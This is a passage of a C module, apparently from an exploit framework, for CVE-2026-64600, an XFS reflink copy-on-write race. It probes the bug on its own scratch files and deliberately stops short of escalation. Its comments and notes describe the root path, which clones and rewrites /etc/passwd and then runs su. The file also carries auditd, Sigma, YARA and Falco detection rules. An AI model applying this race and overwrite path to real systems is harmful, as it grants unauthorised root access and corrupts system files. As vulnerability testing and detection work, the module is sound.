        /* SKELETONKEY_XFS_ASSUME_REFLINK=1 lets an operator assert a target we
         * could not see. If the scratch dir is not actually XFS, say so loudly:
         * btrfs implements FICLONE and reports FIEMAP_EXTENT_SHARED too, so
         * phase A would "confirm" against a filesystem this CVE cannot affect,
         * and a not-won race there is evidence of nothing at all. */
        if (!rfx_dir_is_writable_xfs(dir) && !ctx->json)
            fprintf(stderr, "[!] refluxfs: scratch dir %s is NOT on an XFS "
                            "filesystem (proceeding on the "
                            "SKELETONKEY_XFS_ASSUME_REFLINK assertion) — the "
                            "race cannot fire here regardless of the kernel; "
                            "treat the outcome as inconclusive, never as "
                            "evidence that a host is patched\n", dir);

        char scratch[RFX_SCRATCH_MAX];
        snprintf(scratch, sizeof scratch, "%s/" RFX_SCRATCH_PREFIX "XXXXXX", dir);
        if (!mkdtemp(scratch)) _exit(RFX_RC_SETUP_FAIL);

        char donor[PATH_MAX], clone[PATH_MAX];
        if (rfx_build_pair(scratch, donor, sizeof donor, clone, sizeof clone) != 0) {
            rfx_remove_scratch(scratch);
            _exit(RFX_RC_NO_SHARE);
        }

        /* Phase A — deterministic, read-only confirmation that the state the
         * bug misjudges exists here.
         *
         * The FICLONE inside rfx_build_pair() already succeeded, and that is
         * the authoritative signal: a shared extent now exists by
         * construction. FIEMAP is CORROBORATION of that refcount state, not
         * the gate — filesystems can report the SHARED flag lazily (only after
         * the extent is committed), and refusing to continue on that alone
         * would emit a false "not reachable here" on a genuinely vulnerable
         * host. O_DIRECT, by contrast, IS a gate: without it
         * xfs_direct_write_iomap_begin is never entered and there is no race
         * to exercise. */
        int shared = rfx_extent_is_shared(clone);
        int odirect_ok = 0;
        int t = open(clone, O_RDWR | O_DIRECT);
        if (t >= 0) { odirect_ok = 1; close(t); }

        if (!odirect_ok) {
            if (!ctx->json)
                fprintf(stderr, "[-] refluxfs: phase A — O_DIRECT unavailable "
                                "here; the direct-I/O CoW path cannot be "
                                "entered, so the race is unreachable\n");
            rfx_remove_scratch(scratch);
            _exit(RFX_RC_SETUP_FAIL);
        }
        if (!ctx->json)
            fprintf(stderr, "[+] refluxfs: phase A — reflink clone succeeded "
                            "(shared extent established) and O_DIRECT is "
                            "available; FIEMAP corroboration: %s. The vulnerable "
                            "CoW path is reachable here.\n",
                    shared == 1 ? "FIEMAP_EXTENT_SHARED set"
                  : shared == 0 ? "flag not reported — proceeding anyway"
                                : "FIEMAP undetermined — proceeding anyway");

        /* Phase B — hard-bounded race window exercise. */
        int won = 0, rounds = 0;
        time_t deadline = time(NULL) + RFX_RACE_BUDGET_SECS;
        for (int i = 0; i < RFX_RACE_ROUNDS && time(NULL) < deadline && !won; i++) {
            /* Re-establish the shared extent each round: a successful CoW
             * breaks sharing, so without this only the first round would race
             * against a genuinely shared block. */
            if (i > 0 &&
                rfx_build_pair(scratch, donor, sizeof donor, clone, sizeof clone) != 0)
                break;
            int d = rfx_race_round(donor, clone);
            rounds = i + 1;
            if (d == 1) won = 1;
        }

        if (!ctx->json)
            fprintf(stderr, "[i] refluxfs: phase B — %d bounded race rounds "
                            "fired; donor on-disk content %s\n",
                    rounds, won ? "DIVERGED" : "intact");

        rfx_remove_scratch(scratch);
        _exit(won ? RFX_RC_SHARED_WIN : RFX_RC_SHARED_NO_WIN);
    }

    int status;
    waitpid(child, &status, 0);

    if (WIFSIGNALED(status)) {
        if (!ctx->json)
            fprintf(stderr, "[!] refluxfs: child died by signal %d during the "
                            "bounded race — unexpected for a data-only bug; "
                            "no root was obtained\n", WTERMSIG(status));
        return SKELETONKEY_EXPLOIT_FAIL;
    }
    if (!WIFEXITED(status)) return SKELETONKEY_EXPLOIT_FAIL;

    switch (WEXITSTATUS(status)) {
    case RFX_RC_SHARED_WIN:
        if (!ctx->json) {
            fprintf(stderr, "[!] refluxfs: CVE-2026-64600 CONFIRMED PRESENT — a "
                            "racing O_DIRECT write landed on a still-shared "
                            "block and rewrote the donor file's on-disk bytes. "
                            "That is the arbitrary-overwrite primitive, observed "
                            "empirically, contained entirely to our own scratch "
                            "files.\n");
            fprintf(stderr, "[i] refluxfs: NOT escalated. Turning this into root "
                            "means pointing the same race at a file we do not "
                            "own (the public PoC reflink-clones /etc/passwd into "
                            "/var/tmp and rewrites it in place, then `su`). That "
                            "step persistently corrupts a system file on disk "
                            "with no undo, so it is documented in MODULE.md and "
                            "NOT bundled. Honest EXPLOIT_FAIL.\n");
        }
        return SKELETONKEY_EXPLOIT_FAIL;
    case RFX_RC_SHARED_NO_WIN:
        if (!ctx->json) {
            fprintf(stderr, "[!] refluxfs: the vulnerable path IS reachable here "
                            "(shared extent + O_DIRECT confirmed) but the "
                            "deliberately under-driven race was not won in %d "
                            "rounds / %ds — honest EXPLOIT_FAIL.\n",
                    RFX_RACE_ROUNDS, RFX_RACE_BUDGET_SECS);
            fprintf(stderr, "[i] refluxfs: absence of a win does NOT mean the "
                            "host is patched — the public PoC uses 32 writers, 8 "
                            "helpers and grinds far longer. Trust the version + "
                            "vendor-erratum verdict, not this timing result.\n");
        }
        return SKELETONKEY_EXPLOIT_FAIL;
    case RFX_RC_NO_SHARE:
        if (!ctx->json)
            fprintf(stderr, "[-] refluxfs: could not establish an observably "
                            "shared extent (FICLONE or FIEMAP refused) — reflink "
                            "may be disabled on this filesystem; bug not "
                            "reachable here\n");
        return SKELETONKEY_EXPLOIT_FAIL;
    default:
        if (!ctx->json)
            fprintf(stderr, "[-] refluxfs: probe setup failed — no writable XFS "
                            "scratch directory, or O_DIRECT unavailable\n");
        return SKELETONKEY_EXPLOIT_FAIL;
    }
}

/* Sweep scratch directories left behind if a trigger run was killed mid-round.
 * The trigger removes its own scratch dir on every normal path; this exists for
 * the abnormal ones. It only ever removes directories matching our own
 * prefix, inside the candidate dirs we would have used. */
static skeletonkey_result_t refluxfs_cleanup(const struct skeletonkey_ctx *ctx)
{
    char dir[RFX_DIR_MAX];
    bool assumed = false;
    if (!rfx_find_xfs_dir(dir, sizeof dir, &assumed)) {
        if (!ctx->json)
            fprintf(stderr, "[i] refluxfs: no XFS scratch directory in play — "
                            "nothing to clean\n");
        return SKELETONKEY_OK;
    }

    DIR *d = opendir(dir);
    if (!d) return SKELETONKEY_OK;

    int removed = 0;
    struct dirent *e;
    while ((e = readdir(d)) != NULL) {
        if (strncmp(e->d_name, RFX_SCRATCH_PREFIX,
                    sizeof(RFX_SCRATCH_PREFIX) - 1) != 0)
            continue;
        char path[PATH_MAX];
        snprintf(path, sizeof path, "%s/%s", dir, e->d_name);
        struct stat st;
        if (lstat(path, &st) != 0) continue;
        if (S_ISDIR(st.st_mode)) { rfx_remove_scratch(path); removed++; }
        else if (unlink(path) == 0)  { removed++; }
    }
    closedir(d);

    if (!ctx->json)
        fprintf(stderr, "[+] refluxfs: cleaned %d leftover scratch entr%s under "
                        "%s\n", removed, removed == 1 ? "y" : "ies", dir);
    return SKELETONKEY_OK;
}

#else  /* !__linux__ */

static skeletonkey_result_t refluxfs_detect(const struct skeletonkey_ctx *ctx)
{
    if (!ctx->json)
        fprintf(stderr, "[i] refluxfs: Linux-only module (XFS reflink CoW race) "
                        "— not applicable here\n");
    return SKELETONKEY_PRECOND_FAIL;
}
static skeletonkey_result_t refluxfs_exploit(const struct skeletonkey_ctx *ctx)
{
    (void)ctx;
    fprintf(stderr, "[-] refluxfs: Linux-only module — cannot run here\n");
    return SKELETONKEY_PRECOND_FAIL;
}
static skeletonkey_result_t refluxfs_cleanup(const struct skeletonkey_ctx *ctx)
{
    (void)ctx;
    return SKELETONKEY_OK;
}

#endif /* __linux__ */

/* ----- Embedded detection rules -----
 *
 * Read this before deploying, because RefluXFS inverts the usual assumption:
 *
 * THE OBVIOUS RULE DOES NOT WORK. The canonical file-integrity anchors for a
 * /etc/passwd overwrite — `-w /etc/passwd -p wa`, AIDE/Tripwire mtime+size
 * comparison, `auditctl` watches on the inode — DO NOT FIRE for this CVE. The
 * attacker never issues a write(2) against the victim inode; XFS applies their
 * data to the shared physical block underneath it. Size, mtime and ctime are
 * unchanged, and there is no kernel log output. Anyone relying on FIM to catch
 * a passwd modification is blind to this bug by construction.
 *
 * WHAT DOES WORK, in descending order of fidelity:
 *   1. The reflink itself. ioctl(fd, FICLONE=0x40049409, srcfd) is rare on a
 *      normal server and auditd can match the request number exactly. The
 *      attack REQUIRES cloning the victim file, so this is on the critical
 *      path. Tune out cp --reflink=auto / podman / systemd-nspawn image work.
 *   2. O_DIRECT opens (openat flags & 0x4000). Also on the critical path, and
 *      rare outside databases and backup agents.
 *   3. Content-vs-metadata drift. Because the on-disk bytes change while mtime
 *      does not, hashing /etc/passwd, /etc/shadow and the setuid binaries on a
 *      schedule and alerting when the CONTENT hash moves without a
 *      corresponding mtime change is a near-zero-false-positive detector for
 *      this class. That is what the yara rule below is for.
 * Correlate 1 and 2 per-pid inside a short window; individually each is benign.
 */
static const char refluxfs_auditd[] =
    "# RefluXFS — XFS reflink CoW ILOCK race (CVE-2026-64600) — auditd rules\n"
    "#\n"
    "# IMPORTANT: do NOT rely on `-w /etc/passwd -p wa` for this CVE. The\n"
    "# overwrite is applied to the shared physical block beneath the inode; no\n"
    "# write(2) ever targets /etc/passwd, and its mtime/ctime/size do not\n"
    "# change. That watch will never fire. The rules below anchor on the two\n"
    "# operations the attack cannot avoid.\n"
    "#\n"
    "# 1. The reflink clone. FICLONE = 0x40049409 (_IOW(0x94, 9, int)); matched\n"
    "#    exactly on the ioctl request argument, so this does not flood. If your\n"
    "#    auditctl build rejects hex in an argument field, use decimal 1074041865.\n"
    "-a always,exit -F arch=b64 -S ioctl -F a1=0x40049409 -k skeletonkey-refluxfs-ficlone\n"
    "# 2. O_DIRECT opens (O_DIRECT = 0x4000 = 16384 on x86_64/arm64; it is 0x10000\n"
    "#    on some other arches, so adjust if you deploy beyond x86_64/arm64). The\n"
    "#    race needs direct I/O to reach xfs_direct_write_iomap_begin. Tune out\n"
    "#    database and backup service accounts before enabling fleet-wide.\n"
    "-a always,exit -F arch=b64 -S openat -F a2&0x4000 -k skeletonkey-refluxfs-odirect\n"
    "# 3. Post-exploitation fallback: unprivileged process -> euid 0 with no\n"
    "#    setuid execve (e.g. `su` after the passwd rewrite).\n"
    "-a always,exit -F arch=b64 -S setresuid -F a0=0 -F a1=0 -F a2=0 -F auid>=1000 -F auid!=4294967295 -k skeletonkey-refluxfs-priv\n"
    "-a always,exit -F arch=b64 -S setuid -F a0=0 -F auid>=1000 -F auid!=4294967295 -k skeletonkey-refluxfs-priv\n";

static const char refluxfs_sigma[] =
    "title: Possible CVE-2026-64600 RefluXFS XFS reflink CoW race exploitation\n"
    "id: 7c1e9d52-skeletonkey-refluxfs\n"
    "status: experimental\n"
    "description: |\n"
    "  RefluXFS (CVE-2026-64600) lets any unprivileged user with write access to\n"
    "  a reflink-enabled XFS volume overwrite the on-disk contents of any file\n"
    "  they can read, by racing two O_DIRECT writers through the XFS CoW path\n"
    "  while the ILOCK is dropped to wait for transaction log space.\n"
    "  Detection note: file-integrity monitoring on the victim file DOES NOT\n"
    "  fire — the write bypasses the inode, leaving mtime/ctime/size untouched\n"
    "  and producing no kernel log output. This rule therefore keys on the two\n"
    "  operations the attack requires: an FICLONE reflink (ioctl request\n"
    "  0x40049409) and O_DIRECT opens, correlated to the same process, plus the\n"
    "  post-exploitation euid-0 transition. Expect false positives from\n"
    "  cp --reflink, container image layering, databases and backup agents.\n"
    "logsource: {product: linux, service: auditd}\n"
    "detection:\n"
    "  ficlone: {type: 'SYSCALL', syscall: 'ioctl', a1: '0x40049409'}\n"
    "  odirect: {type: 'SYSCALL', syscall: 'openat', key: 'skeletonkey-refluxfs-odirect'}\n"
    "  uid0:    {type: 'SYSCALL', syscall: 'setresuid', a0: 0, a1: 0, a2: 0}\n"
    "  unpriv:  {auid|expression: '>= 1000'}\n"
    "  timeframe: 60s\n"
    "  condition: (ficlone and odirect) or (uid0 and unpriv)\n"
    "level: high\n"
    "tags: [attack.privilege_escalation, attack.t1068, cve.2026.64600]\n";

/* Unusually for a kernel bug, a yara rule is the RIGHT tool here — precisely
 * because the on-disk artifact is a content change that leaves no metadata
 * trace for FIM to catch. Scan /etc/passwd content, not its stat(2). */
static const char refluxfs_yara[] =
    "rule refluxfs_passwd_root_bypass : cve_2026_64600 lpe file_overwrite\n"
    "{\n"
    "    meta:\n"
    "        cve         = \"CVE-2026-64600\"\n"
    "        description = \"RefluXFS (CVE-2026-64600) on-disk artifact: an /etc/passwd whose root entry has an empty password field, or an added uid-0 account. Content scanning is the right detector for this CVE because the overwrite bypasses the victim inode entirely — mtime/ctime/size never change and nothing is logged, so FIM and auditd file watches never fire. Pair with content-hash-vs-mtime drift monitoring.\"\n"
    "        author      = \"SKELETONKEY\"\n"
    "        reference   = \"https://cdn2.qualys.com/advisory/2026/07/22/RefluXFS.txt\"\n"
    "    strings:\n"
    "        // Canonical PoC outcome: root left with no password hash at all.\n"
    "        $root_nopass_sof = \"root::0:0:\"\n"
    "        $root_nopass_bol = \"\\nroot::0:0:\"\n"
    "        // A second uid-0 account appended by an attacker.\n"
    "        $extra_uid0 = /\\n[a-z_][a-z0-9_-]{0,30}:[^:\\n]{0,64}:0:0:/\n"
    "        // Shape anchor so we only match passwd-formatted files.\n"
    "        $passwd_shape = /root:[^:\\n]{0,64}:0:0:/\n"
    "    condition:\n"
    "        $passwd_shape and\n"
    "        ($root_nopass_sof at 0 or $root_nopass_bol or $extra_uid0)\n"
    "}\n";

static const char refluxfs_falco[] =
    "- rule: XFS reflink clone plus O_DIRECT write burst (possible CVE-2026-64600)\n"
    "  desc: |\n"
    "    RefluXFS (CVE-2026-64600) XFS reflink copy-on-write race. The attack must\n"
    "    reflink-clone the file it wants to overwrite and then issue concurrent\n"
    "    O_DIRECT writes against the clone, so the highest-fidelity signal is an\n"
    "    FICLONE ioctl (request 0x40049409) whose SOURCE file is owned by another\n"
    "    user - a normal workload almost never reflinks a file it does not own -\n"
    "    followed by O_DIRECT opens from the same pid. Requires an ioctl-aware\n"
    "    probe that exposes the request argument; where that is unavailable, fall\n"
    "    back to the O_DIRECT and euid-0 conditions below. Note that watching the\n"
    "    victim file for writes is useless here: the overwrite never touches its\n"
    "    inode, so no write event is ever emitted for it.\n"
    "  condition: >\n"
    "    (evt.type = ioctl and evt.arg.request = 0x40049409 and user.uid != 0) or\n"
    "    (evt.type = open and evt.arg.flags contains O_DIRECT and\n"
    "     fd.name startswith /var/tmp and user.uid != 0) or\n"
    "    (evt.type in (setuid, setresuid) and evt.arg.uid = 0 and\n"
    "     not proc.is_setuid = true and user.uid != 0)\n"
    "  output: >\n"
    "    Possible CVE-2026-64600 RefluXFS reflink CoW race\n"
    "    (user=%user.name proc=%proc.name pid=%proc.pid ppid=%proc.ppid evt=%evt.type fd=%fd.name)\n"
    "  priority: WARNING\n"
    "  tags: [filesystem, mitre_privilege_escalation, T1068, cve.2026.64600]\n";

const struct skeletonkey_module refluxfs_module = {
    .name           = "refluxfs",
    .cve            = "CVE-2026-64600",
    .summary        = "XFS reflink CoW ILOCK-cycling race (\"RefluXFS\") — a stale data-fork mapping makes a direct-I/O writer treat a still-shared block as private, overwriting the on-disk contents of any readable file; unprivileged, no userns, no offsets",
    .family         = "xfs",
    .kernel_range   = "4.11 <= K < fix (introduced 3c68d44a2b49, direct-I/O CoW allocation in iomap_begin); fixed 2f4acd0fcd86 (\"xfs: resample the data fork mapping after cycling ILOCK\", mainline 7.2-rc4, merged 2026-07-16), stable backports 7.1.4 / 6.18.39 / 6.12.96; the 6.6 / 6.1 / 5.15 / 5.14 / 5.10 / 4.19 / 4.18 LTS lines have no upstream stable fix in the CNA record at time of writing (vendors backport without bumping the base version); < 4.11 not affected. Reachable only where an XFS filesystem with reflink=1 is mounted and writable — the mkfs.xfs default since xfsprogs 5.1, and the installer default on RHEL/CentOS/Rocky/Alma/Oracle/CloudLinux 8-10, Fedora Server >= 31 and Amazon Linux 2023",
    .detect         = refluxfs_detect,
    .exploit        = refluxfs_exploit,
    .mitigate       = NULL,   /* no runtime mitigation exists: reflink is a superblock feature that cannot be disabled on a live filesystem, O_DIRECT cannot be turned off, and SELinux/seccomp/KASLR/SMEP/SMAP are all irrelevant to a data-oriented bug. Patch the kernel and reboot. */
    .cleanup        = refluxfs_cleanup,
    .detect_auditd  = refluxfs_auditd,
    .detect_sigma   = refluxfs_sigma,
    .detect_yara    = refluxfs_yara,
    .detect_falco   = refluxfs_falco,
    .opsec_notes    = "detect() combines a kernel-version gate (vulnerable iff >= 4.11 AND below the on-branch fix: backports 7.1.4 / 6.18.39 / 6.12.96, 7.2+ inherits mainline; the 6.6/6.1/5.15/5.14/5.10/4.19/4.18 lines have no upstream fix yet) with a REAL precondition probe — a writable directory on a mounted XFS filesystem, identified by statfs(2) f_type == XFS_SUPER_MAGIC rather than by a successful FICLONE, because btrfs implements FICLONE too and is unaffected. Without such a directory the verdict is PRECOND_FAIL, which is the correct answer on a stock Debian/Ubuntu host. Passively this touches nothing; under --active it additionally writes and removes two 4 KiB files to confirm reflink=1 via FICLONE. Override with SKELETONKEY_XFS_ASSUME_REFLINK=1/0. Big caveat: the exposed population is overwhelmingly RHEL-family and those vendors backport without bumping the upstream version, so on rpm-family hosts a VULNERABLE verdict speaks only to the upstream base version — detect() prints that warning rather than implying it checked the erratum. exploit() forks an isolated child that creates a private mkdtemp scratch directory on the XFS mount and works ONLY on two files it owns: (A) it writes a donor, FICLONE-clones it, and confirms via FIEMAP that the clone's extent carries FIEMAP_EXTENT_SHARED — a read-only, deterministic observation that the refcount-btree state the bug misjudges exists here, plus an O_DIRECT open check; then (B) it races 8 concurrent O_DIRECT 4 KiB writes against the clone with 2 ftruncate/fdatasync helpers cycling the ILOCK, for at most 16 rounds / 2 s, and stops — deliberately under-driven against the public PoC's 32 writers and 8 helpers. It reads the donor back with O_DIRECT (a buffered read would be served from the page cache the corruption bypasses) and reports divergence honestly. It NEVER clones or targets a file it does not own: the step that yields root — reflink-cloning /etc/passwd into a writable dir and racing writes onto its shared blocks, then `su` — persistently rewrites a system file on disk with no undo and is documented but NOT bundled. Always returns EXPLOIT_FAIL. Telemetry footprint — an ioctl(FICLONE) burst, many O_DIRECT opens of the same path, and ftruncate/fdatasync churn, all inside a scratch dir named skeletonkey-refluxfs-*; no kernel log output, no dmesg lines, and no panic/oops risk whatsoever since the bug corrupts file data rather than kernel memory (a won race damages 4 KiB of our own scratch file and nothing else — the reason this ranks far above bad_epoll/ghostlock in --auto safety despite being unverified). Artifacts are removed on every normal path; --cleanup sweeps skeletonkey-refluxfs-* leftovers if a run was killed. Blue-team note worth repeating: file-integrity monitoring on the victim file does NOT detect this attack, because the overwrite never touches the victim's inode and leaves mtime/ctime/size unchanged.",
    .arch_support   = "any",
};

void skeletonkey_register_refluxfs(void)
{
    skeletonkey_register(&refluxfs_module);
}
